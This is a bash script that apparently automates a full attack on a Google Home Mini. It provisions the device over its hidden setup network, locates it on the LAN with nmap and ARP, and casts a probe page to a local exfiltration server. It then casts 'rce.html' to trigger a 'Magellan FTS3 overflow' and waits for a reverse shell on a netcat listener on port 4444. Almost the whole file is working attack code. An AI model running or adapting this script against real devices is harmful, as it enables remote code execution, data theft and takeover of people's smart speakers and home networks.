#!/usr/bin/env bash
# full-attack.sh — Magellan attack with hard timeouts on every phase.
# Internet outage: ~20s max (provision step). Everything else on Livebox.
# Output: /tmp/attack.log
#
# Usage: bash scripts/full-attack.sh [--probe-only]

MISE_PY=/home/tkmremi/.local/share/mise/installs/python/latest/bin/python3
MISE_SP=/home/tkmremi/.local/share/mise/installs/python/3.15.1/lib/python3.15/site-packages
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
MAGELLAN="$ROOT/reconstruction/exploit/magellan"
MY_IP="192.168.1.24"
MINI_MAC="44:07:0b:d2:6f:36"
PROBE_ONLY="${1:-}"
LOG="/tmp/attack.log"

export PYTHONPATH="$MISE_SP"
exec > >(tee -a "$LOG") 2>&1
> "$LOG"  # clear log on each run

log() { echo "[$(date '+%H:%M:%S')] $*"; }
die() { log "FATAL: $*"; exit 1; }

log "===== ATTACK START ====="

# ── cleanup: always restore internet ─────────────────────────────────────────
cleanup() {
  log "Cleanup: restoring Livebox..."
  pkill -f "exfil_server.py" 2>/dev/null; pkill -f "nc -lvnp 4444" 2>/dev/null
  nmcli con delete "gh-prov" 2>/dev/null; nmcli con up "Livebox-C5C0" 2>/dev/null | tail -1
  log "===== DONE. Log: $LOG ====="
}
trap cleanup EXIT INT TERM

# ── PHASE 0: start servers (while internet is up) ────────────────────────────
log "PHASE 0: starting servers on $MY_IP..."
pkill -f "exfil_server.py" 2>/dev/null; pkill -f "nc -lvnp 4444" 2>/dev/null
sleep 0.5
$MISE_PY "$MAGELLAN/exfil_server.py" --ip "$MY_IP" & EXFIL_PID=$!
nc -lvnp 4444 & NC_PID=$!
sleep 0.5
curl -s --max-time 3 "http://$MY_IP:8080/probe.html" -o /dev/null && log "Exfil server OK" || die "exfil server failed to start"

# ── PHASE 1: provision (internet down ~20s) ──────────────────────────────────
log "PHASE 1: provisioning (internet down for ~20s)..."
T0=$SECONDS

nmcli con delete "gh-prov" 2>/dev/null
nmcli con add type wifi con-name "gh-prov" ssid "GoogleHome4983.o," \
  autoconnect no 802-11-wireless.hidden yes \
  ipv4.method auto ipv6.method ignore 2>/dev/null | tail -1

nmcli con down "Livebox-C5C0" 2>/dev/null
nmcli con up "gh-prov" 2>&1 | tail -1

# wait for DHCP — hard 15s timeout
SETUP_GW=""
for i in $(seq 1 15); do
  SETUP_GW=$(ip route 2>/dev/null | awk '/^default via 192\.168\.255\./{print $3}' | head -1)
  [[ -n "$SETUP_GW" ]] && { log "DHCP OK: gw=$SETUP_GW (${i}s)"; break; }
  sleep 1
done
[[ -z "$SETUP_GW" ]] && die "DHCP failed on setup AP"

# provision: fetch key + encrypt + connect_wifi — hard 15s timeout
timeout 15 $MISE_PY - <<'PYEOF' || die "provision python failed"
import json, ssl, urllib.request, sys, base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
base = "https://192.168.255.249:8443"

def api(path, data=None):
    d = json.dumps(data).encode() if data else None
    h = {"Content-Type":"application/json"} if d else {}
    req = urllib.request.Request(base+path, data=d, headers=h, method="POST" if d else "GET")
    with urllib.request.urlopen(req, timeout=6, context=ctx) as r:
        body = r.read(); return json.loads(body) if body else {}

ei = api("/setup/eureka_info")
pub_b64 = ei.get("device_info",{}).get("public_key") or ei.get("public_key","")
build = ei.get("build_version","?")
print(f"[*] build={build}", flush=True)

psk = "&PI_0123456789="
key = RSA.import_key(base64.b64decode(pub_b64))
enc = base64.b64encode(PKCS1_v1_5.new(key).encrypt(psk.encode())).decode()

nets = api("/setup/scan_results")
# prefer 2.4 GHz BSSID (:c8); Mini gen1 is 2.4GHz only
candidates = [n for n in nets if n.get("ssid") == "Livebox-C5C0"]
target = next((n for n in candidates if n.get("bssid","").lower().endswith(":c8")), None) \
      or next(iter(candidates), None)
if not target: print(f"[!] no Livebox-C5C0 in scan: {[n.get('ssid') for n in nets[:5]]}",flush=True); sys.exit(1)
bssid=target["bssid"]; cipher=target.get("wpa_cipher",4)
print(f"[*] target={bssid} cipher={cipher}", flush=True)

payload={"ssid":"Livebox-C5C0","wpa_auth":7,"wpa_cipher":cipher,"bssid":bssid,"enc_passwd":enc}
try:
    r = api("/setup/connect_wifi", payload)
    print(f"[+] connect_wifi OK: {r!r}", flush=True)
except urllib.error.HTTPError as e:
    print(f"[!] HTTP {e.code}: {e.read()}", flush=True); sys.exit(1)
PYEOF

log "Provision done in $((SECONDS-T0))s. Restoring internet..."

# ── PHASE 2: restore internet ─────────────────────────────────────────────────
nmcli con delete "gh-prov" 2>/dev/null
nmcli con up "Livebox-C5C0" 2>&1 | tail -1
log "Internet restored. Total outage: $((SECONDS-T0))s"

# ── PHASE 3: find Mini on LAN — hard 90s ─────────────────────────────────────
log "PHASE 3: finding Mini ($MINI_MAC) on LAN — timeout 90s..."
MINI_IP=""
DEADLINE=$((SECONDS+90))
while [[ $SECONDS -lt $DEADLINE && -z "$MINI_IP" ]]; do
  # nmap ping scan — fast, no arping loop
  nmap -sn -T5 --host-timeout 2s 192.168.1.0/24 -oG /tmp/nmap_scan.txt 2>/dev/null
  while IFS= read -r line; do
    ip=$(echo "$line" | grep -oP '(?<=Host: )\S+')
    [[ -z "$ip" ]] && continue
    mac=$(arp -n "$ip" 2>/dev/null | awk '{print tolower($3)}' | grep "^44:07" | head -1)
    [[ "$mac" == "$MINI_MAC" ]] && { MINI_IP="$ip"; break; }
  done < /tmp/nmap_scan.txt
  [[ -n "$MINI_IP" ]] && break
  # also check ARP cache directly
  MINI_IP=$(arp -n 2>/dev/null | awk -v m="$MINI_MAC" 'tolower($3)==m{print $1}' | head -1)
  [[ -n "$MINI_IP" ]] && break
  log "No Mini yet ($((DEADLINE-SECONDS))s left)..."
  sleep 5
done

if [[ -z "$MINI_IP" ]]; then
  log "FAIL: Mini not found. Checking if it reverted to setup AP..."
  nmcli dev wifi list 2>/dev/null | grep -i "google\|FA:8F" | head -3
  die "Mini not found on LAN after 90s"
fi
log "Mini found at $MINI_IP (took $((SECONDS-T0))s)"

# ── PHASE 4: wait for Cast port 8009 — hard 800s (Mini does OTA check on join) ─
log "PHASE 4: waiting for Cast port 8009 on $MINI_IP — timeout 800s..."
CAST_OPEN=0
DEADLINE=$((SECONDS+800))
while [[ $SECONDS -lt $DEADLINE ]]; do
  if nc -z -w2 "$MINI_IP" 8009 2>/dev/null; then
    log "Cast port 8009 OPEN (took $((SECONDS-T0))s)"; CAST_OPEN=1; break
  fi
  if nc -z -w2 "$MINI_IP" 8008 2>/dev/null; then
    log "Cast port 8008 OPEN (took $((SECONDS-T0))s)"; CAST_OPEN=1; break
  fi
  # also confirm Mini is still in ARP (didn't revert to setup AP)
  if ! arp -n 2>/dev/null | awk -v m="$MINI_MAC" 'tolower($3)==m{found=1}END{exit !found}'; then
    log "Mini disappeared from ARP! Probably reverted to setup mode. Aborting Phase 4."
    break
  fi
  log "Waiting for Cast port... ($((DEADLINE-SECONDS))s left)"
  sleep 10
done
[[ $CAST_OPEN -eq 0 ]] && log "WARNING: Cast port never opened (trying anyway)"

# ── PHASE 5: LAUNCH CC1AD845, connect to session, LOAD probe.html ─────────────
log "PHASE 5: LAUNCH CC1AD845 → session connect → LOAD probe.html..."
timeout 90 $MISE_PY "$MAGELLAN/cast_load.py" "$MINI_IP" "$MY_IP"

log "Waiting 60s for exfil..."
sleep 60

log "Probe exfil results:"
for f in "$ROOT/evidence"/magellan-exfil-*.json; do
  [[ -f "$f" ]] || continue
  log "  $(basename $f):"
  python3 -m json.tool "$f" 2>/dev/null | grep '"msg"' | tail -8
done

[[ "$PROBE_ONLY" == "--probe-only" ]] && { log "Probe-only done."; exit 0; }

# ── PHASE 6: RCE via Magellan ─────────────────────────────────────────────────
log "PHASE 6: casting rce.html → Magellan FTS3 overflow..."
timeout 90 $MISE_PY "$MAGELLAN/cast_load.py" "$MINI_IP" "$MY_IP" --url "http://${MY_IP}:8080/rce.html" &
log "Waiting 60s for reverse shell on nc (PID=$NC_PID)..."
sleep 60
log "RCE phase done. Check nc output above."
